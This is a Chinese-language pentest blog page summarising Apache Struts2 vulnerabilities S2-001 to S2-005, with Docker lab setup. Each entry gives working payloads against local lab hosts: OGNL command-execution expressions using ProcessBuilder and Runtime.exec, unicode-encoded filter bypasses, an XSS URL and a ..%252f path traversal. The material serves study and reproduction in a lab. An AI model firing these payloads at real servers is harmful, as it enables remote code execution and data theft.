@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Struts2漏洞汇总 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Struts2漏洞汇总</h2>
+  <p class="post-date">2021-02-26</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p><code>备注：以下文章部分参考互联网各位大佬整理得到,如未及时添加出处还请及时提出.</code></p>
+<h3 id="Struts-2-概述"><a href="#Struts-2-概述" class="headerlink" title="Struts 2 概述"></a>Struts 2 概述</h3><p>Struts2是一个基于MVC(Models、View、Controller)设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 Struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与Servlet API完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。</p>
+<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p><a target="_blank" rel="noopener" href="https://hub.docker.com/r/2d8ru/struts2">2d8ru/struts2</a></p>
+<p>可参考Apache Struts官方连接，不同版本中漏洞情况也不一致;下载对应版本Struts即可验证对应漏洞。</p>
+<p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/struts/binaries/">各版本下载</a></p>
+<p><img src="/images/Struts2/image-20210206144619247.png"></p>
+<center>漏洞情况</center>
+docker镜像包含以下部分,其他漏洞还请及时搭建测试环境进行复现。
+
+<p>S2-001 (CVE-2007-4556) </p>
+<p>S2-002（无CVE）</p>
+<p>S2-003（无CVE）</p>
+<p>S2-005(CVE-2010-1870)</p>
+<p>S2-006(CVE-2011-1772)</p>
+<p>S2-007 (CVE-2012-0838) </p>
+<p>S2-008 (CVE-2012-0392) </p>
+<p>S2-009(CVE-2011-3923)</p>
+<p>S2-012(CVE-2013-1965) </p>
+<p>S2-013(CVE-2013-1966)</p>
+<p>S2-014(CVE-2013-2115)</p>
+<p>S2-015(CVE-2013-2135, CVE-2013-2134) </p>
+<p>S2-016 (CVE-2013-2251) </p>
+<p>S2-019 (CVE-2013-4316) </p>
+<p>S2-020(CVE-2014-0050、CVE-2014-0094)</p>
+<p>S2-029 (CVE-2016-0785) </p>
+<p>S2-032 (CVE-2016-3081) </p>
+<p>S2-033 (CVE-2016-3087) </p>
+<p>S2-037 (CVE-2016-4438) </p>
+<p>S2-045 (CVE-2017-5638) </p>
+<p>S2-046 (CVE-2017-5638) </p>
+<p>S2-048 (CVE-2017-9791) </p>
+<p>S2-052 (CVE-2017-9805) </p>
+<p>S2-053 (CVE-2017-12611)</p>
+<p>S2-057 (CVE-2018-11776)</p>
+<p>S2-059(CVE-2019-0230)</p>
+<p>S2-061(CVE-2020-17530)</p>
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h4><p>OGNL是Object Graphic Navigation Language(对象导航图语言)的缩写，他是一个开源项目。Struts框架使用OGNL作为默认的表达式语言。</p>
+<h5 id="OGNL特点"><a href="#OGNL特点" class="headerlink" title="OGNL特点"></a>OGNL特点</h5><p>应用于Java中的一个开源的表达式语言（Expression Language）；它被集成在Struts2等框架中，作用是对数据进行访问，它拥有类型转换、访问对象方法、操作集合对象等功能。</p>
+<h5 id="OGNL安全"><a href="#OGNL安全" class="headerlink" title="OGNL安全"></a>OGNL安全</h5><p>由于OGNL能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞。多个Apache Struts 2版本容易受到OGNL安全漏洞的攻击。</p>
+<p>S2-001、S2-003等部分版本均因OGNL问题导致出现漏洞。</p>
+<h4 id="REST插件"><a href="#REST插件" class="headerlink" title="REST插件"></a>REST插件</h4><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型；映射关系：</p>
+<table>
+<thead>
+<tr>
+<th>扩展</th>
+<th>Content-type</th>
+<th>解析方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml</td>
+<td>application/xml</td>
+<td>xstream</td>
+</tr>
+<tr>
+<td>json</td>
+<td>application/json</td>
+<td>jsonlib或jackson</td>
+</tr>
+<tr>
+<td>xhtml</td>
+<td>application/xhtml-xml</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>application/X-WWW-form-urlencoded</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>mulipart/form-data</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><h5 id="镜像拉取"><a href="#镜像拉取" class="headerlink" title="镜像拉取"></a>镜像拉取</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 2d8ru/struts2</span><br></pre></td></tr></table></figure>
+
+<h5 id="环境启动"><a href="#环境启动" class="headerlink" title="环境启动"></a>环境启动</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 2d8ru/struts2</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="拉取项目"><a href="#拉取项目" class="headerlink" title="拉取项目"></a>拉取项目</h5><p>下载对应项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-057</span><br></pre></td></tr></table></figure>
+
+<h5 id="项目启动"><a href="#项目启动" class="headerlink" title="项目启动"></a>项目启动</h5><p>在环境目录下执行以下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h4><p><code>虚拟机</code>+<code>Tomcat</code>+<code>Struts2</code>版本</p>
+<p>相关链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Struts2 版本</span><br><span class="line">http:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;struts&#x2F;binaries&#x2F;</span><br><span class="line"># Tomcat 版本</span><br><span class="line">http:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;tomcat&#x2F;tomcat-6&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞实战分类"><a href="#漏洞实战分类" class="headerlink" title="漏洞实战分类"></a>漏洞实战分类</h3><h4 id="CVE-2007-4556"><a href="#CVE-2007-4556" class="headerlink" title="CVE-2007-4556"></a>CVE-2007-4556</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-001</p>
+<blockquote>
+<p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%&#123;value&#125;</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</p>
+</blockquote>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 ～ Struts 2.0.8</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%&#123;value&#125;</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后后端一般会默认返回之前提交的数据，由于后端使用 <code>%&#123;value&#125;</code> 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。<code>%&#123;1+1&#125;</code></p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>版本要求</p>
+<p>Struts 2.0.0 ～ Struts 2.0.8</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>0、URL访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录页</span></span><br><span class="line">http://192.168.3.204:8080/S2-001/login.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210201114722823.png" alt="image-20210201114722823"></p>
+<p>1、password输入<code>%&#123;1+1&#125;</code></p>
+<p><img src="/images/Struts2/image-20210201112315271.png" alt="image-20210201112315271"></p>
+<p>2、提交，报错返回解析成了<code>2</code></p>
+<p><img src="/images/Struts2/image-20210201112430016.png" alt="image-20210201112430016"></p>
+<p>3、命令执行</p>
+<p>替换<code>pwd</code>其他命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210201161515178.png" alt="image-20210201161515178"></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>增加了对OGNL递归解析次数的判断，默认情况下只会解析第一层</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-001</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="S2-002-无CVE"><a href="#S2-002-无CVE" class="headerlink" title="S2-002(无CVE)"></a>S2-002(无CVE)</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于 Struts 2 框架在处理<code>&lt;s:url&gt;</code>和<code>&lt;s:a&gt;</code>两个标签时，未对标签内的字符进行有效转义，导致存在 XSS 漏洞。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 ~ Struts 2.1.8</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>应用程序在处理标签时，未对标签内的字符进行转义处理导致产生XSS漏洞。</p>
+<h5 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>版本要求</p>
+<p>Struts 2.0.0 ~Struts 2.1.8</p>
+<p>验证版本:Struts 2.0.1</p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、xmapp安装</p>
+<p>解压并安装</p>
+<p>2、部署Struts 2.0.1项目</p>
+<p>解压对应zip包，拷贝showcase的war包至,并启动Tomcat服务</p>
+<p><img src="/images/Struts2/image-20210206162925336.png" alt="image-20210206162925336"></p>
+<p>3、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;struts2-showcase-2.0.1&#x2F;continuations&#x2F;guess.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210206163015783.png" alt="image-20210206163015783"></p>
+<p>4、构造Exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;struts2-showcase-2.0.1&#x2F;continuations&#x2F;guess.action?&lt;script&gt;alert(&#39;si1ent&#39;)&lt;&#x2F;script&gt;test&#x3D;si1ent</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210206163419657.png" alt="image-20210206163419657"></p>
+<center>XSS代码执行成功</center>
+
+
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、版本更新</p>
+<h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;86c54d6d3c71</span><br><span class="line"># 官方</span><br><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-002</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="S2-003-无CVE"><a href="#S2-003-无CVE" class="headerlink" title="S2-003(无CVE)"></a>S2-003(无CVE)</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts会将HTTP的每个参数名解析为OGNL语句执行(可以理解为Java代码)。OGNL表达式通过<code>#</code>来访问struts的对象，Struts框架通过过滤<code>#</code>字符防止安全问题，通过unicode编码(u0023)或8进制(43)即可绕过安全限制，从而能够操纵服务器端上下文对象。</p>
+<h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts会将HTTP的每个参数名解析为OGNL语句执行(可以理解为Java代码)。OGNL表达式通过<code>#</code>来访问struts的对象，Struts框架通过过滤<code>#</code>字符防止安全问题，通过unicode编码(u0023)或8进制(43)即可绕过安全限制，从而能够操纵服务器端上下文对象。</p>
+<h5 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Tomcat-7.0.78本身限定了特殊字符;要验证此漏洞，需要安装Tomcat 6.0</p>
+<p>Struts2 版本：</p>
+<p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、部署jdk、jre环境</p>
+<p><code>java version &quot;1.6.0_45&quot;</code></p>
+<p>2、Tomcat版本</p>
+<p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/tomcat/tomcat-6/v6.0.9/bin/">Tomcat 6.0.9</a></p>
+<p>3、Struts2版本</p>
+<p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/struts/binaries/">struts-2.0.11.2</a></p>
+<p>4、解压至对应目录</p>
+<p><img src="/images/Struts2/image-20210218111329877.png" alt="image-20210218111329877"></p>
+<p>5、部署Struts</p>
+<p><img src="/images/Struts2/image-20210218111358228.png" alt="image-20210218111358228"></p>
+<p>6、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.167:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218111448577.png" alt="image-20210218111448577"></p>
+<p>7、执行payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure>
+
+<p>8、执行结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.167:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;showcase.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218111642832.png" alt="image-20210218111642832"></p>
+<center>代码执行成功</center>
+
+
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、Tomcat版本更新</p>
+<p>2、Struts 2 版本更新</p>
+<h5 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-003</span><br></pre></td></tr></table></figure>
+
+<h4 id="S2-004-无CVE"><a href="#S2-004-无CVE" class="headerlink" title="S2-004(无CVE)"></a>S2-004(无CVE)</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-004主要原因是目录遍历漏洞，通过如下方式进行目录跳转获取想要敏感数据资源。</p>
+<p>../经过URL二次编码后得到：..%252f</p>
+<h5 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - 2.0.11.2</p>
+<p>Struts 2.1.0 - 2.1.2</p>
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2 dispatcher逻辑的设计允许为请求URI提供web应用程序类路径中的特定静态资源，请求uri的上下文相对路径以“/struts/”开头</p>
+<p>类似如：<code>/struts2-showcase-2.0.11.2/struts/..%252f</code>须添加<code>struts</code>路径</p>
+<h5 id="漏洞条件-3"><a href="#漏洞条件-3" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - 2.0.11.2</p>
+<p>Struts 2.1.0 - 2.1.2</p>
+<h5 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境搭建参考如上S2-003漏洞</p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218135439157.png" alt="image-20210218135439157"></p>
+<p>3、payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;struts&#x2F;..%252f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218135843503.png" alt="image-20210218135843503"></p>
+<p>4、获取key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;&#x2F;struts&#x2F;..%252f..%252f..%252f..%252f..%252f..%252fshowcase.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218140158257.png" alt="image-20210218140158257"></p>
+<center>老版本无key信息</center>
+
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、Struts2.0.12之后已修复此漏洞</p>
+<h5 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-004</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2010-1870"><a href="#CVE-2010-1870" class="headerlink" title="CVE-2010-1870"></a>CVE-2010-1870</h4><p>S2-005</p>
+<h5 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。</p>
+<p>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p>
+<p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句</p>
+<h5 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h5 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。</p>
+<p>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p>
+<h5 id="漏洞条件-4"><a href="#漏洞条件-4" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h5 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218142747110.png" alt="image-20210218142747110"></p>
+<p>2、payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.184:8080&#x2F;struts2-showcase-2.0.11.2&#x2F;showcase.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210218142856459.png" alt="image-20210218142856459"></p>
